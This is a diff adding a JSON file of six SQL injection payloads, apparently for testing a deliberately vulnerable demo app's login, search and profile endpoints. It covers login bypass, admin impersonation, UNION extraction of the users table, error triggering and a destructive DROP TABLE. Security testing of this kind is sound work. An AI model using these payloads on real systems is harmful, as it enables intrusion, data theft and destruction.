@@ -1,0 +1,48 @@
+[
+  {
+    "id": 1,
+    "name": "Login Bypass",
+    "description": "Classic OR-based payload that makes the WHERE clause always true, bypassing the password check entirely.",
+    "action": "login_post",
+    "payload": "' OR '1'='1' -- ",
+    "password": "anything"
+  },
+  {
+    "id": 2,
+    "name": "Specific User Impersonation",
+    "description": "Targets an admin username and comments out the password condition with --.",
+    "action": "login_post",
+    "payload_template": "{admin_username}' -- ",
+    "password": "wrong-password"
+  },
+  {
+    "id": 3,
+    "name": "UNION Data Extraction",
+    "description": "Appends a UNION SELECT to the product search, leaking the users table into search results.",
+    "action": "search_get",
+    "payload": "%' UNION SELECT id, username, email, role FROM users -- "
+  },
+  {
+    "id": 4,
+    "name": "Boolean Blind Injection",
+    "description": "Injects OR 1=1 into the profile id parameter so every user row is returned.",
+    "action": "profile_get",
+    "payload": "1 OR 1=1"
+  },
+  {
+    "id": 5,
+    "name": "Error-Based Injection",
+    "description": "Sends a single quote to break the SQL syntax and trigger a raw error / traceback.",
+    "action": "login_post",
+    "payload": "'",
+    "password": "anything"
+  },
+  {
+    "id": 6,
+    "name": "Stacked Query (DROP TABLE)",
+    "description": "Attempts to chain a DROP TABLE statement. SQLite blocks this, but MySQL/Postgres would not.",
+    "action": "login_post",
+    "payload": "'; DROP TABLE users; --",
+    "password": "anything"
+  }
+]
